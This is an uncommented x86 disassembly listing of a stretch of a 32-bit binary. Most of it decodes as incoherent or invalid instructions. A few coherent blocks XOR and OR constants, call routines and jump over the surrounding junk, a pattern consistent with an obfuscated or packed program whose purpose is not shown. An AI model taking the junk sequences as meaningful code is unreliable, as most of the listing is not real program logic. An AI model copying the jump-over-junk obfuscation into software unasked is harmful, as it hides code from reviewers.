  41a049:	pop    DWORD PTR [ebx+0x3a41b93c]
  41a04f:	aas    
  41a050:	pop    ss
  41a051:	jne    0x41a058
  41a053:	shl    DWORD PTR [ecx+ebp*1],cl
  41a056:	fs jge 0x41a043
  41a059:	call   0x93719689
  41a05e:	xchg   BYTE PTR [edi+0x0],cl
  41a061:	and    esi,edx
  41a063:	mov    ds:0x972a0a8b,al
  41a068:	outs   dx,BYTE PTR ds:[esi]
  41a069:	idiv   DWORD PTR [esi-0x77e9bf35]
  41a06f:	cdq    
  41a070:	test   al,0x97
  41a072:	imul   DWORD PTR [edi]
  41a074:	retf   
  41a075:	jo     0x41a0ea
  41a077:	(bad)  
  41a078:	ins    BYTE PTR es:[edi],dx
  41a079:	dec    edx
  41a07a:	pop    ebp
  41a07b:	mov    bl,0xe9
  41a07d:	sub    al,0x28
  41a07f:	push   ebp
  41a080:	in     al,0xa3
  41a082:	mov    ah,0x9a
  41a084:	xlat   BYTE PTR ds:[ebx]
  41a085:	lahf   
  41a086:	mov    ebx,0x1b08931d
  41a08b:	xor    esp,DWORD PTR [edi-0x59ab3a5]
  41a091:	cmp    BYTE PTR [edi-0xca1fd05],cl
  41a097:	ds iret 
  41a099:	cmc    
  41a09a:	pop    esi
  41a09b:	dec    eax
  41a09c:	push   0x37
  41a09e:	sbb    edx,DWORD PTR [edi]
  41a0a0:	lock outs dx,BYTE PTR ds:[esi]
  41a0a2:	mov    ah,BYTE PTR [edi]
  41a0a4:	iret   
  41a0a5:	mov    gs,WORD PTR [ebx]
  41a0a7:	ja     0x41a036
  41a0a9:	jbe    0x41a087
  41a0ab:	test   DWORD PTR es:[edx],esp
  41a0ae:	jae    0x41a125
  41a0b0:	add    edi,DWORD PTR [ebp+0x6100c993]
  41a0b6:	call   0x9ffe3945
  41a0bb:	dec    ebp
  41a0bc:	call   DWORD PTR [edx]
  41a0be:	and    al,0xd7
  41a0c0:	out    0x27,al
  41a0c2:	mov    cl,dl
  41a0c4:	or     bl,al
  41a0c6:	jmp    0x44c33449
  41a0cb:	loop   0x41a0e0
  41a0cd:	(bad)  
  41a0ce:	cmp    BYTE PTR [ebx-0x48],bl
  41a0d1:	pusha  
  41a0d2:	sub    ebx,DWORD PTR [ebp*2+0x5dd20a56]
  41a0d9:	mov    bl,BYTE PTR [eax]
  41a0db:	dec    eax
  41a0dc:	ret    0xd7b9
  41a0df:	outs   dx,BYTE PTR ds:[esi]
  41a0e0:	jmp    0x68372b9b
  41a0e5:	mov    cl,BYTE PTR [ebx]
  41a0e7:	jb     0x41a0f6
  41a0e9:	xor    bh,BYTE PTR [esi]
  41a0eb:	xor    eax,0x2815a324
  41a0f0:	pop    esp
  41a0f1:	inc    esi
  41a0f2:	call   0xb348:0xf7d37579
  41a0f9:	inc    edx
  41a0fa:	cwde   
  41a0fb:	fld    QWORD PTR [ebx+ebx*4-0x57]
  41a0ff:	push   esi
  41a100:	daa    
  41a101:	push   0x9845eda5
  41a106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a107:	rol    BYTE PTR [esi+0x1f],0x17
  41a10b:	push   cs
  41a10c:	pop    ecx
  41a10d:	not    BYTE PTR [edi-0x6bf963f4]
  41a113:	mov    eax,0x2f5023ab
  41a118:	iret   
  41a119:	sub    edx,eax
  41a11b:	dec    edi
  41a11c:	sub    eax,0xd8a871aa
  41a121:	dec    edi
  41a122:	mov    al,ds:0x7a35805b
  41a127:	(bad)  
  41a128:	cmp    edi,DWORD PTR [ebx]
  41a12a:	dec    edx
  41a12b:	mov    dl,0x50
  41a12d:	and    eax,0xf36b0bf5
  41a132:	dec    edi
  41a133:	lock pop es
  41a135:	inc    eax
  41a136:	in     eax,dx
  41a137:	sar    BYTE PTR [ecx],0x93
  41a13a:	cli    
  41a13b:	fnsetpm(287 only) 
  41a13d:	push   ds
  41a13e:	inc    edx
  41a13f:	in     eax,dx
  41a140:	pop    eax
  41a141:	ret    0x6966
  41a144:	mov    BYTE PTR [ebx+esi*8-0x198c546f],al
  41a14b:	and    al,bl
  41a14d:	mov    DWORD PTR [ecx+eiz*1+0xe],esi
  41a151:	das    
  41a152:	sti    
  41a153:	add    dh,BYTE PTR [ebx+0x48]
  41a156:	in     eax,dx
  41a157:	cmp    DWORD PTR [ebp-0x24],edi
  41a15a:	stos   BYTE PTR es:[edi],al
  41a15b:	arpl   WORD PTR [ecx],si
  41a15d:	fld    TBYTE PTR [ecx+0x2e1eaa5f]
  41a163:	ins    BYTE PTR es:[edi],dx
  41a164:	mov    esi,0xd689d0c2
  41a169:	jo     0x41a179
  41a16b:	ret    
  41a16c:	pop    ds
  41a16d:	cmp    bl,BYTE PTR [ebx-0x12561d29]
  41a173:	xchg   BYTE PTR [ebx],ah
  41a175:	je     0x41a1c5
  41a177:	mov    ah,0xda
  41a179:	adc    al,0x5d
  41a17b:	sub    eax,0x646f7e77
  41a180:	test   al,0xce
  41a182:	push   edi
  41a183:	(bad)  
  41a184:	ins    BYTE PTR es:[edi],dx
  41a185:	mov    DWORD PTR [edi-0x30],eax
  41a188:	(bad)  
  41a189:	sub    BYTE PTR [ebx-0x3bad1a81],al
  41a18f:	mov    dl,0x83
  41a191:	push   ecx
  41a192:	adc    eax,0x9946a3fe
  41a197:	and    DWORD PTR [eax+0x8],0xffffffe6
  41a19b:	(bad)  [eax]
  41a19d:	mov    edx,DWORD PTR [edx]
  41a19f:	and    eax,0xb1a8c38e
  41a1a4:	pushf  
  41a1a5:	xchg   ebx,eax
  41a1a6:	pushf  
  41a1a7:	push   ecx
  41a1a8:	mov    BYTE PTR [edi-0x4db9720d],ah
  41a1ae:	jnp    0x41a15d
  41a1b0:	cli    
  41a1b1:	mov    dh,0x44
  41a1b3:	xchg   esp,eax
  41a1b4:	jne    0x41a17a
  41a1b6:	addr16 pop es
  41a1b8:	or     DWORD PTR [ebp-0x53],ecx
  41a1bb:	add    dl,BYTE PTR [eax-0xb5082a9]
  41a1c1:	jae    0x41a176
  41a1c3:	fst    QWORD PTR [edi+0x5ce5c626]
  41a1c9:	popa   
  41a1ca:	jp     0x41a1b2
  41a1cc:	and    bh,BYTE PTR [edi-0x127a343a]
  41a1d2:	aas    
  41a1d3:	out    0xdc,eax
  41a1d5:	add    al,0x11
  41a1d7:	inc    esp
  41a1d8:	mov    ds:0x628716d,al
  41a1dd:	ror    BYTE PTR [edx+esi*1-0x6d9bf61a],0xc2
  41a1e5:	xchg   esp,eax
  41a1e6:	jne    0x41a266
  41a1e8:	scas   eax,DWORD PTR es:[edi]
  41a1e9:	idiv   ch
  41a1eb:	adc    esi,DWORD PTR [edi+0x2f4a5d3c]
  41a1f1:	mov    bh,0xea
  41a1f3:	dec    edi
  41a1f4:	and    BYTE PTR [ebx],0xe0
  41a1f7:	out    0xc7,eax
  41a1f9:	push   eax
  41a1fa:	inc    ebx
  41a1fb:	mov    eax,0x5c07d5d7
  41a200:	fcos   
  41a202:	jecxz  0x41a27f
  41a204:	xchg   edx,eax
  41a205:	test   al,0x69
  41a207:	fimul  DWORD PTR [ebp+0x75]
  41a20a:	adc    ecx,DWORD PTR [eax+0x7cfb976c]
  41a210:	out    0xc6,eax
  41a212:	shr    BYTE PTR [esi+0x6f0400b2],0x86
  41a219:	ds leave 
  41a21b:	sbb    cl,ah
  41a21d:	xor    eax,0x5d25c2a5
  41a222:	xor    al,BYTE PTR [eax]
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	fucomp st(5)
  41a2a2:	xor    DWORD PTR [esi+0x1816ad2b],edi
  41a2a8:	mov    esp,0x70181812
  41a2ad:	mov    WORD PTR [eax-0xa],?
  41a2b0:	add    BYTE PTR [edi+eiz*2],0xbc
  41a2b4:	(bad)  
  41a2b5:	stc    
  41a2b6:	xor    eax,0x6161fb36
  41a2bb:	in     eax,dx
  41a2bc:	add    bl,BYTE PTR [edi-0x6c461234]
  41a2c2:	inc    ebx
  41a2c3:	xchg   BYTE PTR [ebx],bl
  41a2c5:	(bad)
  41a2c8:	jp     0x41a2b0
  41a2ca:	mov    edi,0x233e4b14
  41a2cf:	stos   DWORD PTR es:[edi],eax
  41a2d0:	mov    edi,0xd65a6ba3
  41a2d5:	sbb    eax,0x97db72f2
  41a2da:	mov    ebx,0xa1b865f7
  41a2df:	mov    bl,BYTE PTR [edx+0x44f630ad]
  41a2e5:	inc    edx
  41a2e6:	and    dh,BYTE PTR [ecx]
  41a2e8:	jnp    0x41a32c
  41a2ea:	pusha  
  41a2eb:	ins    BYTE PTR es:[edi],dx
  41a2ec:	pusha  
  41a2ed:	gs jg  0x41a357
  41a2f0:	sbb    eax,0x72cb0a40
  41a2f5:	loop   0x41a2ec
  41a2f7:	jecxz  0x41a331
  41a2f9:	push   ecx
  41a2fa:	or     ebp,DWORD PTR [ebp+ecx*8+0x7cf6c89b]
  41a301:	or     dh,BYTE PTR ds:0xa21639e6
  41a307:	int3   
  41a308:	sbb    BYTE PTR [ebx],dl
  41a30a:	stos   DWORD PTR es:[edi],eax
  41a30b:	hlt    
  41a30c:	inc    esi
  41a30d:	push   ebx
  41a30e:	arpl   WORD PTR [ecx+0x0],di
  41a311:	and    DWORD PTR [esi],edx
  41a313:	test   al,0xe
  41a315:	loope  0x41a2e2
  41a317:	es es pop esi
  41a31a:	fsubr  DWORD PTR [ecx+0x8]
  41a31d:	push   cs
  41a31e:	jns    0x41a2fb
  41a320:	icebp  
  41a321:	xchg   BYTE PTR [edi+0x553f7d19],cl
  41a327:	mov    al,0xd4
  41a329:	xchg   esp,eax
  41a32a:	out    dx,eax
  41a32b:	fist   DWORD PTR [ecx]
  41a32d:	sub    DWORD PTR [esi-0x60],esp
  41a330:	stc    
  41a331:	mov    cl,ah
  41a333:	in     eax,dx
  41a334:	jge    0x41a2e4
  41a336:	mov    ebx,0x97f034f5
  41a33b:	cwde   
  41a33c:	or     BYTE PTR [edi-0x3b],bh
  41a33f:	ja     0x41a301
  41a341:	inc    ecx
  41a342:	sub    DWORD PTR [ebp-0x49ffe20e],0xffffffc5
  41a349:	and    eax,DWORD PTR [edi+0x6a414e0f]
  41a34f:	pop    es
  41a350:	cmp    bh,BYTE PTR [ecx+0x4f]
  41a353:	lea    ecx,[edi+eax*8+0x1e]
  41a357:	loopne 0x41a364
  41a359:	push   edx
  41a35a:	loopne 0x41a336
  41a35c:	stc    
  41a35d:	cwde   
  41a35e:	cld    
  41a35f:	pop    ebx
  41a360:	push   ebp
  41a361:	sar    DWORD PTR [eax+eax*4],cl
  41a364:	ins    BYTE PTR es:[edi],dx
  41a365:	jle    0x41a3cd
  41a367:	(bad)  
  41a368:	fld    DWORD PTR [eax-0x4f2b8b85]
  41a36e:	mov    BYTE PTR ds:0x58f10bf9,al
  41a374:	call   0x4f3d503c
  41a379:	lock loopne 0x41a378
  41a37c:	cmp    ecx,DWORD PTR [ecx]
  41a37e:	dec    eax
  41a37f:	lods   eax,DWORD PTR ds:[esi]
  41a380:	popa   
  41a381:	xor    al,0x25
  41a383:	test   al,0xf2
  41a385:	rol    dh,cl
  41a387:	adc    al,0xa7
  41a389:	cld    
  41a38a:	push   eax
  41a38b:	in     al,dx
  41a38c:	xor    ah,bl
  41a38e:	push   0xa301699a
  41a393:	and    BYTE PTR [edi-0x3d],al
  41a396:	sub    BYTE PTR [eax-0x42],0x13
  41a39a:	ret    0x2936
  41a39d:	hlt    
  41a39e:	ins    BYTE PTR es:[edi],dx
  41a39f:	mov    edx,0x6e9fdfba
  41a3a4:	leave  
  41a3a5:	sbb    eax,0x59cf07d4
  41a3aa:	lahf   
  41a3ab:	mov    BYTE PTR [edi+eiz*2+0x561b5486],bl
  41a3b2:	mul    ebx
  41a3b4:	arpl   WORD PTR [ebx+eiz*1],bp
  41a3b7:	xlat   BYTE PTR ds:[ebx]
  41a3b8:	sar    bl,cl
  41a3ba:	sbb    BYTE PTR [edx+ebx*4-0x2],0xe5
  41a3bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3c0:	fcom   DWORD PTR [ecx-0x5315a3e8]
  41a3c6:	or     al,ch
  41a3c8:	mov    dh,0x51
  41a3ca:	dec    esp
  41a3cb:	js     0x41a42f
  41a3cd:	out    0xf0,al
  41a3cf:	int    0xcf
  41a3d1:	mov    esp,0x181bb750
  41a3d6:	adc    ebp,ecx
  41a3d8:	hlt    
  41a3d9:	inc    edx
  41a3da:	je     0x41a445
  41a3dc:	dec    eax
  41a3dd:	ror    DWORD PTR [ebx],cl
  41a3df:	jno    0x41a381
  41a3e1:	pop    es
  41a3e2:	xchg   edi,eax
  41a3e3:	xor    DWORD PTR [ecx],edi
  41a3e5:	mul    DWORD PTR [eax+ebx*4-0xa]
  41a3e9:	mul    DWORD PTR [edi]
  41a3eb:	dec    esi
  41a3ec:	jne    0x41a417
  41a3ee:	jmp    0x41a41c
  41a3f0:	jno    0x41a3d2
  41a3f2:	adc    BYTE PTR [esi+0x34],bh
  41a3f5:	dec    ebp
  41a3f6:	in     eax,dx
  41a3f7:	and    al,0x68
  41a3f9:	jle    0x41a3cd
  41a3fb:	lods   eax,DWORD PTR ds:[esi]
  41a3fc:	fbld   TBYTE PTR [eax]
  41a3fe:	jge    0x41a39e
  41a400:	or     cl,BYTE PTR [esi-0x12]
  41a403:	fsub   QWORD PTR [ebp-0x6d120ab]
  41a409:	stc    
  41a40a:	push   cs
  41a40b:	pop    ebx
  41a40c:	dec    esi
  41a40d:	in     eax,0xf8
  41a40f:	inc    edx
  41a410:	jecxz  0x41a3e9
  41a412:	sub    BYTE PTR [edi],dl
  41a414:	test   eax,0x26e09ff7
  41a419:	shl    bl,1
  41a41b:	test   BYTE PTR [ebx-0x55e3c03c],0x63
  41a422:	mov    cs,WORD PTR [esi]
  41a424:	jno    0x41a454
  41a426:	and    cl,BYTE PTR [edi+ebx*4]
  41a429:	sbb    eax,0x3e68cbaa
  41a42e:	gs addr16 pop ds
  41a431:	jb     0x41a49a
  41a433:	jnp    0x41a405
  41a435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a436:	ss int 0x68
  41a439:	rdmsr  
  41a43b:	arpl   WORD PTR [esi+0x75e34914],cx
  41a441:	or     bl,BYTE PTR [edi-0x33]
  41a444:	sub    edi,DWORD PTR [esi-0x50]
  41a447:	mov    BYTE PTR [eax+0xc],0x34
  41a44b:	mov    al,0xc0
  41a44d:	push   eax
  41a44e:	test   BYTE PTR [ebx+0x1577b168],al
  41a454:	retf   0x25bf
  41a457:	push   cs
  41a458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a459:	test   ecx,0x19d1f43c
  41a45f:	lds    ebp,FWORD PTR [ebp+0x26]
  41a462:	repz push esp
  41a464:	jo     0x41a4e5
  41a466:	ffreep st(1)
  41a468:	leave  
  41a469:	jg     0x41a44b
  41a46b:	sub    eax,0x43010850
  41a470:	inc    ecx
  41a471:	das    
  41a472:	pop    es
  41a473:	and    eax,0x12d55357
  41a478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a479:	add    esp,ecx
  41a47b:	mov    ecx,gs
  41a47d:	mov    dl,0x4d
  41a47f:	add    al,0x51
  41a481:	sahf   
  41a482:	mov    edi,DWORD PTR [ebp-0x2b05ff97]
  41a488:	sbb    eax,0x789fe7c1
  41a48d:	repnz out dx,al
  41a48f:	call   0x7716:0x70f3dc42
  41a496:	sbb    DWORD PTR [eax+0x56],ecx
  41a499:	adc    ah,ah
  41a49b:	das    
  41a49c:	sub    eax,DWORD PTR [esp+eiz*2+0x6f505828]
  41a4a3:	and    eax,esi
  41a4a5:	pop    ebp
  41a4a6:	jmp    0xd2e0:0x28702dfc
  41a4ad:	sbb    bh,BYTE PTR [ebp-0x4b]
  41a4b0:	fisubr DWORD PTR [edi+eax*4+0x53]
  41a4b4:	cmp    eax,0x2fb41765
  41a4b9:	cmp    eax,eax
  41a4bb:	push   cs
  41a4bc:	js     0x41a4a0
  41a4be:	pop    esp
  41a4bf:	or     al,0xdc
  41a4c1:	loopne 0x41a45a
  41a4c3:	int3   
  41a4c4:	loop   0x41a53d
  41a4c6:	loope  0x41a536
  41a4c8:	or     ah,BYTE PTR [edx+0x17]
  41a4cb:	and    DWORD PTR [edx-0x5acc7bc1],0x240a478
  41a4d5:	cs stos BYTE PTR es:[edi],al
  41a4d7:	or     dl,BYTE PTR [ebx]
  41a4d9:	and    al,0xaa
  41a4db:	pop    ecx
  41a4dc:	cmp    esp,ebp
  41a4de:	mov    esi,0x3b7641f8
  41a4e3:	push   es
  41a4e4:	adc    eax,0x29819a2
  41a4e9:	enter  0xf5a6,0x1c
  41a4ed:	mov    dl,0x2b
  41a4ef:	xchg   ecx,eax
  41a4f0:	and    DWORD PTR [edx],eax
  41a4f2:	out    0x87,eax
  41a4f4:	retf   0x5249
  41a4f7:	mov    eax,0x63bb4c58
  41a4fc:	clc    
  41a4fd:	push   cs
  41a4fe:	ror    BYTE PTR [edx],0xc2
  41a501:	sbb    eax,0xfb1969b7
  41a506:	shl    BYTE PTR [edx+0x68c36c1e],0x35
  41a50d:	mov    eax,ds:0xafbd503e
  41a512:	inc    edx
  41a513:	xlat   BYTE PTR ds:[ebx]
  41a514:	push   eax
  41a515:	jmp    0x7fbda0bf
  41a51a:	jl     0x41a58f
  41a51c:	fld    QWORD PTR [ecx-0x47926a0a]
  41a522:	jo     0x41a4f1
  41a524:	xchg   ebx,eax
  41a525:	cmp    eax,0x30e34bce
  41a52a:	xchg   BYTE PTR [esi+ecx*1],bh
  41a52d:	push   edx
  41a52e:	xor    eax,0x424e0001
  41a533:	cmc    
  41a534:	repnz push ss
  41a536:	jnp    0x41a508
  41a538:	stc    
  41a539:	mov    esp,0x3827bbab
  41a53e:	enter  0xc2f6,0xbf
  41a542:	enter  0x9b7c,0x6a
  41a546:	fisub  WORD PTR [ebx+esi*1-0xf]
  41a54a:	frstor [edx]
  41a54c:	cmp    eax,0x8a0eabb1
  41a551:	jecxz  0x41a52e
  41a553:	adc    eax,0x3033827d
  41a558:	(bad)  
  41a559:	sub    BYTE PTR [edi+eax*4-0x25],dh
  41a55d:	outs   dx,DWORD PTR ds:[esi]
  41a55e:	call   0xeb809645
  41a563:	aam    0x4d
  41a565:	test   DWORD PTR [ecx+0x4d332ec3],esi
  41a56b:	retf   0x4078
  41a56e:	mov    dh,0x68
  41a570:	test   BYTE PTR [esp+ecx*8-0x77c24a48],bl
  41a577:	add    al,0xba
  41a579:	cdq    
  41a57a:	rol    BYTE PTR [edi+0x5173b959],1
  41a580:	aas    
  41a581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a582:	cmp    BYTE PTR [ebp+0x22],al
  41a585:	xchg   ch,dl
  41a587:	mov    dh,0xff
  41a589:	mov    al,BYTE PTR [edx-0x3ca64e86]
  41a58f:	adc    dl,BYTE PTR [ecx-0x2171a756]
  41a595:	ret    
  41a596:	(bad)  
  41a597:	(bad)  cs:[eax]
  41a59a:	xchg   BYTE PTR [edi-0x47],cl
  41a59d:	sub    ebp,DWORD PTR [ecx]
  41a59f:	pop    ecx
  41a5a0:	push   ebp
  41a5a1:	loop   0x41a54a
  41a5a3:	jge    0x41a555
  41a5a5:	jne    0x41a5bf
  41a5a7:	loopne 0x41a56b
  41a5a9:	inc    esi
  41a5aa:	and    BYTE PTR [ebx-0x2f6c6720],ch
  41a5b0:	push   0xd4d868af
  41a5b5:	sbb    ecx,esi
  41a5b7:	cmp    al,BYTE PTR [ebx]
  41a5b9:	in     eax,dx
  41a5ba:	dec    edi
  41a5bb:	mov    bl,0x21
  41a5bd:	pop    ss
  41a5be:	jbe    0x41a5f9
  41a5c0:	rcl    edx,cl
  41a5c2:	outs   dx,BYTE PTR ds:[esi]
  41a5c3:	jbe    0x41a5cd
  41a5c5:	lahf   
  41a5c6:	cld    
  41a5c7:	push   ds
  41a5c8:	ja     0x41a5b5
  41a5ca:	and    al,0x4
  41a5cc:	or     DWORD PTR [edi+ebx*8],0xfffffffb
  41a5d0:	fistp  DWORD PTR [esi-0xe]
  41a5d3:	mov    ds:0x7bc49336,eax
  41a5d8:	cld    
  41a5d9:	xor    bh,BYTE PTR [eax]
  41a5db:	aad    0xc3
  41a5dd:	xchg   BYTE PTR [esi],bl
  41a5df:	mov    bl,0xb2
  41a5e1:	jmp    0x93135818
  41a5e6:	xchg   esi,eax
  41a5e7:	sub    BYTE PTR [edx],bl
  41a5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5ea:	cmp    al,0x98
  41a5ec:	call   FWORD PTR [eax-0x5b2d25fa]
  41a5f2:	mov    eax,0x6abe3732
  41a5f7:	fwait
  41a5f8:	pushf  
  41a5f9:	fdiv   DWORD PTR [edi+0x46]
  41a5fc:	imul   edi,DWORD PTR [edi+eax*1+0x56],0x32
  41a601:	gs scas al,BYTE PTR es:[edi]
  41a603:	sub    DWORD PTR [esi-0x5],0xa141aa59
  41a60a:	mov    cl,0x74
  41a60c:	jle    0x41a649
  41a60e:	retf   0xfdf7
  41a611:	loope  0x41a5e4
  41a613:	mov    cl,0x92
  41a615:	popa   
  41a616:	out    0xa5,eax
  41a618:	cli    
  41a619:	(bad)  [esi+0x3e]
  41a61c:	out    dx,al
  41a61d:	pop    edi
  41a61e:	mov    ds,WORD PTR [esp-0x69adf2c1]
  41a625:	test   BYTE PTR [ebx-0x43],ch
  41a628:	mov    bl,cl
  41a62a:	xor    al,0xa
  41a62c:	dec    ebx
  41a62d:	retf   0xb78f
  41a630:	sbb    al,0x54
  41a632:	aaa    
  41a633:	sahf   
  41a634:	imul   esp,DWORD PTR [esi-0x79bc50d9],0xffffffe0
  41a63b:	cld    
  41a63c:	mov    ds:0xc69be5f6,al
  41a641:	scas   eax,DWORD PTR es:[edi]
  41a642:	xor    dl,cl
  41a644:	das    
  41a645:	in     eax,dx
  41a646:	inc    edi
  41a647:	imul   eax,DWORD PTR [ebx-0x2ea211d3],0xc9d09800
  41a651:	inc    esp
  41a652:	xor    DWORD PTR gs:[esi-0x715ac46b],edx
  41a659:	mov    al,ds:0x4cf5d1e5
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x422031
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	inc    esi
  41a749:	dec    ebx
  41a74a:	inc    ebp
  41a74b:	push   0xffffffcf
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x16061818],bh
  41a756:	mov    edx,0x891bc926
  41a75b:	repz mov dl,0x43
  41a75e:	and    BYTE PTR [ecx],0x21
  41a761:	sbb    eax,DWORD PTR [edx+0x19e84c24]
  41a767:	add    DWORD PTR [eax-0xd],edi
  41a76a:	jecxz  0x41a7c3
  41a76c:	fiadd  WORD PTR [ebx+edx*1+0x5a47ae7f]
  41a773:	ret    
  41a774:	and    cl,BYTE PTR [ecx+0x72e2d927]
  41a77a:	imul   ecx,DWORD PTR [edi-0xf],0xefc6dc6d
  41a781:	mov    dh,0xb3
  41a783:	out    dx,eax
  41a784:	rcr    DWORD PTR [ebp-0x31b3d390],0x24
  41a78b:	jl     0x41a7e6
  41a78d:	aam    0x8d
  41a78f:	es es in eax,0x56
  41a793:	popf   
  41a794:	fcmovne st,st(2)
  41a796:	and    eax,DWORD PTR [edx+0x48dc6294]
  41a79c:	addr16 jge 0x41a7fa
  41a79f:	pop    ss
  41a7a0:	push   eax
  41a7a1:	pop    esp
  41a7a2:	jbe    0x41a790
  41a7a4:	mov    ebp,ecx
  41a7a6:	sti    
  41a7a7:	imul   eax,DWORD PTR [ecx+eiz*1-0x43],0x74e7ad12
  41a7af:	scas   al,BYTE PTR es:[edi]
  41a7b0:	mov    bl,0xbf
  41a7b2:	jl     0x41a757
  41a7b4:	mov    cs,WORD PTR [eax]
  41a7b6:	adc    esi,DWORD PTR [edx-0x78]
  41a7b9:	adc    dl,ah
  41a7bb:	jl     0x41a7a1
  41a7bd:	nop
  41a7be:	dec    ecx
  41a7bf:	fsub   DWORD PTR [esi+0x5]
  41a7c2:	mov    dh,0xbf
  41a7c4:	pop    ds
  41a7c5:	inc    esp
  41a7c6:	sar    DWORD PTR [ebx-0x56],0x44
  41a7ca:	sbb    eax,ecx
  41a7cc:	outs   dx,DWORD PTR ds:[esi]
  41a7cd:	mov    DWORD PTR [edi+0x4af6746],edi
  41a7d3:	xor    esi,ebp
  41a7d5:	adc    eax,0x79f258eb
  41a7da:	pop    eax
  41a7db:	rcl    DWORD PTR [edi+0x335f0c13],cl
  41a7e1:	sar    BYTE PTR [ebx-0x5ee11cde],0x56
  41a7e8:	pop    ds
  41a7e9:	repz in al,dx
  41a7eb:	das    
  41a7ec:	pop    ss
  41a7ed:	or     dl,BYTE PTR [eax-0x21]
  41a7f0:	sbb    BYTE PTR [esi],0xa7
  41a7f3:	mov    edi,cs
  41a7f5:	int    0x21
  41a7f7:	add    al,BYTE PTR [eax]
  41a7f9:	(bad)  
  41a7fa:	jp     0x41a7f4
  41a7fc:	or     BYTE PTR ds:0x84e54ef5,0x55
  41a803:	jl     0x41a7a4
  41a805:	push   ss
  41a806:	jg     0x41a815
  41a808:	or     cl,BYTE PTR [esi]
  41a80a:	(bad)
  41a80e:	out    dx,al
  41a80f:	xchg   ebp,eax
  41a810:	loopne 0x41a809
  41a812:	stos   DWORD PTR es:[edi],eax
  41a813:	inc    esp
  41a814:	loopne 0x41a819
  41a816:	mov    ebx,0xa295d29e
  41a81b:	cmp    ebx,DWORD PTR [edi]
  41a81d:	add    BYTE PTR [edx],dl
  41a81f:	scas   al,BYTE PTR es:[edi]
  41a820:	nop
  41a821:	or     eax,0x3e9771fc
  41a826:	cs jge 0x41a86a
  41a829:	xchg   ebp,eax
  41a82a:	inc    edx
  41a82b:	fadd   st,st(7)
  41a82d:	lds    esp,FWORD PTR [ebp-0x1a]
  41a830:	sahf   
  41a831:	mov    esi,0x6e51b9ff
  41a836:	add    edi,0x7e
  41a839:	mov    ds:0xd2150f42,al
  41a83e:	adc    BYTE PTR [eax],dl
  41a840:	ins    BYTE PTR es:[edi],dx
  41a841:	mov    esi,esi
  41a843:	inc    edx
  41a844:	leave  
  41a845:	pusha  
  41a846:	push   edi
  41a847:	adc    DWORD PTR [esi+0x78],edi
  41a84a:	ins    DWORD PTR es:[edi],dx
  41a84b:	add    ch,bh
  41a84d:	imul   ebp,DWORD PTR [edi-0x29],0xffffffad
  41a851:	arpl   WORD PTR [ecx+0x68],ax
